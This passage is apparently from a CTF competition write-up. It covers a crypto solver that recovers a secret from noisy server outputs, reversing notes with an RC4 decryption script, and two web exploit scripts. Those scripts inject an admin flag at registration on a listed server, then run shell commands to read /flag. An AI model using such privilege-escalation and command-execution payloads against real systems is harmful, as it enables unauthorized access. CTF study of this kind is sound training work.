class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    A = [[rng.randint(<span class="number">0</span>, <span class="number">99</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="comment"># 高斯消元求秩</span></span><br><span class="line">    M = [row.copy() <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    rank = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="comment"># 找到当前列的非零主元</span></span><br><span class="line">        pivot = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                pivot = r</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 交换到当前秩行</span></span><br><span class="line">        M[rank], M[pivot] = M[pivot], M[rank]</span><br><span class="line">        <span class="comment"># 归一化主元所在行</span></span><br><span class="line">        inv_val = <span class="built_in">pow</span>(M[rank][col], -<span class="number">1</span>, p)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[rank][c] = (M[rank][c] * inv_val) % p</span><br><span class="line">        <span class="comment"># 消去该列下方元素</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank+<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                factor = M[r][col]</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                    M[r][c] = (M[r][c] - factor * M[rank][c]) % p</span><br><span class="line">        rank += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rank == n:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> rank == n:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 此时 A 为可逆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Matrix A generated (full rank). Beginning queries...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 多次查询获取输出向量数据</span></span><br><span class="line">outputs = []  <span class="comment"># 将存储每次返回的长度128的列表</span></span><br><span class="line"><span class="comment"># 如果先前接收的数据中已经包含初始的 &quot;Give me your choice&gt;&quot; 提示，需要处理</span></span><br><span class="line"><span class="comment"># 寻找提示符位置（如果存在）</span></span><br><span class="line">prompt_index = data.find(<span class="string">&quot;Give me your choice&gt;&quot;</span>)</span><br><span class="line"><span class="comment"># 若接收到 prompt，没有换行，需要人为加上换行以避免干扰后续解析</span></span><br><span class="line"><span class="keyword">if</span> prompt_index != -<span class="number">1</span> <span class="keyword">and</span> data.endswith(<span class="string">&quot;Give me your choice&gt;&quot;</span>):</span><br><span class="line">    <span class="comment"># prompt 没有换行且是最后内容，直接忽略，它会在交互中重新出现</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行 NUM_QUERIES 次查询</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(NUM_QUERIES):</span><br><span class="line">    <span class="comment"># 发送 &#x27;1&#x27; 请求一个样本</span></span><br><span class="line">    sock.sendall(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">    <span class="comment"># 接收该次的输出列表字符串（注意列表较长，需循环读取直到得到完整的&#x27;]&#x27;）</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        chunk = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Connection closed before receiving full response.&quot;</span>)</span><br><span class="line">        resp += chunk</span><br><span class="line">    <span class="comment"># 截取列表字符串部分（从第一个&#x27;[&#x27;到对应的第一个&#x27;]&#x27;）</span></span><br><span class="line">    start = resp.find(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    end = resp.find(<span class="string">&#x27;]&#x27;</span>, start)</span><br><span class="line">    list_str = resp[start:end+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nums = ast.literal_eval(list_str)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Failed to parse output list: <span class="subst">&#123;e&#125;</span>\nData: <span class="subst">&#123;list_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) != n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Output length <span class="subst">&#123;<span class="built_in">len</span>(nums)&#125;</span> != <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    outputs.append(nums)</span><br><span class="line">    <span class="comment"># 打印进度</span></span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Collected <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> samples...&quot;</span>)</span><br><span class="line">    <span class="comment"># 保存末尾未处理的数据（可能包含下一个提示符）</span></span><br><span class="line">    resp = resp[end+<span class="number">1</span>:]</span><br><span class="line">    <span class="comment"># 如果末尾含提示符，下次循环会再次recv，不影响正确性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成采样后，发送非&#x27;1&#x27;使服务器退出循环</span></span><br><span class="line">sock.sendall(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">sock.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Collected <span class="subst">&#123;<span class="built_in">len</span>(outputs)&#125;</span> outputs. Processing data...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 对每个分量聚类去噪，估计 A*s</span></span><br><span class="line">As_values = [<span class="number">0</span>] * n</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    vals = [outputs[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outputs))]</span><br><span class="line">    vals.sort()</span><br><span class="line">    <span class="comment"># 检测是否发生模绕回（两簇现象）</span></span><br><span class="line">    <span class="keyword">if</span> vals[-<span class="number">1</span>] - vals[<span class="number">0</span>] &gt; p // <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># 存在两簇：决定哪簇是主要簇</span></span><br><span class="line">        <span class="comment"># 通过中位数判断主要簇位置</span></span><br><span class="line">        median_val = vals[<span class="built_in">len</span>(vals)//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> median_val &gt; p // <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># 主要簇在高值端，将低值簇的值加上一个模数p</span></span><br><span class="line">            <span class="comment"># 寻找最大间隔点作为簇分界</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            low_cluster_adjusted = [v + p <span class="keyword">for</span> v <span class="keyword">in</span> low_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster_adjusted + high_cluster)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 主要簇在低值端，将高值簇减去一个模数p</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            high_cluster_adjusted = [v - p <span class="keyword">for</span> v <span class="keyword">in</span> high_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster + high_cluster_adjusted)</span><br><span class="line">    <span class="comment"># 取平均值作为 (A*s)_j 的估计，并四舍五入取最近整数</span></span><br><span class="line">    avg_val = <span class="built_in">sum</span>(vals) / <span class="built_in">len</span>(vals)</span><br><span class="line">    As_values[j] = <span class="built_in">int</span>(<span class="built_in">round</span>(avg_val)) % p  <span class="comment"># 最终取模 p 确保在 [0,p) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 计算 s = A^&#123;-1&#125; * (A*s) 来求解 s</span></span><br><span class="line"><span class="comment"># 先对 A 进行模 p 下求逆</span></span><br><span class="line"><span class="comment"># 构造增广矩阵 [A|I] 做高斯消元</span></span><br><span class="line">Aug = [row[:] + [<span class="number">1</span> <span class="keyword">if</span> i == j <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(A)]</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="comment"># 找到主元</span></span><br><span class="line">    pivot = col</span><br><span class="line">    <span class="keyword">while</span> pivot &lt; n <span class="keyword">and</span> Aug[pivot][col] % p == <span class="number">0</span>:</span><br><span class="line">        pivot += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pivot == n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Matrix is singular during inversion (unexpected).&quot;</span>)</span><br><span class="line">    <span class="comment"># 将主元行换到当前列对应行</span></span><br><span class="line">    Aug[col], Aug[pivot] = Aug[pivot], Aug[col]</span><br><span class="line">    inv_val = <span class="built_in">pow</span>(Aug[col][col], -<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># 主元归一化</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        Aug[col][c] = (Aug[col][c] * inv_val) % p</span><br><span class="line">    <span class="comment"># 消去其他行该列</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> r != col:</span><br><span class="line">            factor = Aug[r][col]</span><br><span class="line">            <span class="keyword">if</span> factor != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, <span class="number">2</span>*n):</span><br><span class="line">                    Aug[r][c] = (Aug[r][c] - factor * Aug[col][c]) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取逆矩阵</span></span><br><span class="line">A_inv = [row[n:] <span class="keyword">for</span> row <span class="keyword">in</span> Aug]</span><br><span class="line"><span class="comment"># 计算 s = A_inv * (A*s 值向量)</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        total = (total + A_inv[i][j] * As_values[j]) % p</span><br><span class="line">    s.append(total)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 从 s 导出 flag（s[i] mod 200 为 ASCII 码）</span></span><br><span class="line">flag_chars = [<span class="built_in">chr</span>(x % <span class="number">200</span>) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recovered flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221355601.png" alt="image-20251005221355601"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="am-i-admin"><a href="#am-i-admin" class="headerlink" title="am i admin?"></a>am i admin?</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:56062&quot;</span>  <span class="comment"># 视题目部署实际地址调整</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;IsAdmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] login:&quot;</span>, r.status_code, r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] cookies:&quot;</span>, session.cookies.get_dict())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">cmd, args</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;cmd&quot;</span>: cmd, <span class="string">&quot;args&quot;</span>: args&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">    password = <span class="string">&quot;pwn&quot;</span></span><br><span class="line"></span><br><span class="line">    register(username, password)  <span class="comment"># 第一步：注册并注入 IsAdmin</span></span><br><span class="line">    login(username, password)  <span class="comment"># 第二步：登录拿到 session_id</span></span><br><span class="line">    run_command(<span class="string">&quot;cat&quot;</span>, [<span class="string">&quot;/flag&quot;</span>])  <span class="comment"># 第三步：以管理员身份读 flag</span></span><br><span class="line">    <span class="comment"># run_command(&quot;id&quot;, [])                 # 可执行任意命令测试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221442895.png" alt="image-20251005221442895"></p><h3 id="am-i-admin-2"><a href="#am-i-admin-2" class="headerlink" title="am i admin?2"></a>am i admin?2</h3><p>AI 出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:59608&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span> + secrets.token_hex(<span class="number">4</span>)</span><br><span class="line">    password = <span class="string">&quot;Passw0rd!&quot;</span></span><br><span class="line">    register_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;isadmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=register_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=login_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;login:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    cmd_payload = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /flag&quot;</span>]&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=cmd_payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221511012.png" alt="image-20251005221511012"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="android-native"><a href="#android-native" class="headerlink" title="android-native"></a>android-native</h3><p>native里有RC4校验</p><p>key做了更改</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004104652628.png" alt="image-20251004104652628"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">KEY_BYTES = <span class="built_in">bytearray</span>(<span class="string">b&quot;1m1r6rqro1l~dr&quot;</span>)</span><br><span class="line">CIPHERTEXT = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0xD6</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0x17</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0xB1</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x27</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0xD2</span>, <span class="number">0x75</span>, <span class="number">0x52</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x66</span>, <span class="number">0x4C</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x9B</span>, <span class="number">0x8F</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0xD7</span>, <span class="number">0x08</span>, <span class="number">0xF4</span>, <span class="number">0x6D</span>, <span class="number">0xE7</span>, <span class="number">0xA9</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x9C</span>, <span class="number">0x0F</span>, <span class="number">0x8A</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">MUTATION_MASKS = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">9</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">11</span>: <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="number">0x01</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutate_key</span>(<span class="params">key: <span class="built_in">bytearray</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">for</span> idx, mask <span class="keyword">in</span> MUTATION_MASKS.items():</span><br><span class="line">        key[idx] ^= mask</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    state = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + state[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        k = state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out.append(byte ^ k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    mutated_key = mutate_key(KEY_BYTES.copy())</span><br><span class="line">    flag = rc4_crypt(CIPHERTEXT, mutated_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> rc4_crypt(flag, mutated_key) != CIPHERTEXT:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;sanity check failed; ciphertext mismatch&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mutated key:&quot;</span>, mutated_key.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{de094624-8f5b-44dc-810c-58132a2b5ea3}</p><h3 id="一个饼干人"><a href="#一个饼干人" class="headerlink" title="一个饼干人"></a>一个饼干人</h3><p>Il2CppDumper 检测到“<strong>This file may be protected</strong>”——说明 so 有防护&#x2F;修改，导致它<strong>选择不生成或生成失败</strong>对 IDA&#x2F;Ghidra 的自动重命名脚本。</p><p>github上面的解释</p><blockquote><p>Il2CppDumper检测到可执行文件已被保护，使用<code>GameGuardian</code>从游戏内存中dump <code>libil2cpp.so</code>，然后使用Il2CppDumper载入按提示操作，可绕过大部分保护</p></blockquote><p>这里思路开始偏了，开始去用师傅的另一个项目去拿dump.cs</p><p>拿到之后，又偏了分析libcpp.so导入xx.h和xx.json这俩文件花了1个小时左右</p><p>最后发现逻辑无法分析，然后开始思考cookie</p><p>在asset下发现了delicous，查了下可以解包，用assetstudio没解出来</p><p>用的assetripper解出来了</p><p>手慢了大概没一会，本来二血，居然是小写的c….</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004205252977.png" alt="image-20251004205252977"></p><p>SUSCTF{cookies_GOOD}</p><h3 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h3><p>patch掉花指令，得到主逻辑，中间还有base58，rc4…</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005104309406.png" alt="image-20251005104309406"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">value_map = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(alphabet)&#125;</span><br><span class="line">target = (</span><br><span class="line">    <span class="string">&quot;2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTeRptgvAmfzdqmE9skCSR&quot;</span></span><br><span class="line">    <span class="string">&quot;bEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuE&quot;</span></span><br><span class="line">    <span 